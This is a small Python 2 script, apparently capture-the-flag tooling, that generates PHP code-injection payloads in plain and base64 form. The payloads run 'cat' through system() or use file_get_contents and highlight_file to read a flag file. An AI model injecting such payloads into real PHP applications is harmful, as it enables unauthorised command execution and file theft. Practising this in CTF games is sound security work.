# -*- coding: utf-8 -*-

def get_fake_plain_payloads(flag_path):
    payloads = []
    payloads.append('system("cat %s");' % (flag_path))
    payloads.append('highlight_file("%s");' % (flag_path))
    payloads.append('echo file_get_contents("%s");' % (flag_path))
    payloads.append('var_dump(file_get_contents("%s"));' % (flag_path))
    payloads.append('print_r(file_get_contents("%s"));' % (flag_path))
    return payloads

def get_fake_base64_payloads(flag_path):
    payloads = get_fake_plain_payloads(flag_path)
    return [payload.encode("base64").replace("\n","") for payload in payloads]

def main():
    flag_path = "/home/web/flag/flag"
    print get_fake_plain_payloads(flag_path)
    print get_fake_base64_payloads(flag_path)

if __name__ == "__main__":
    main()
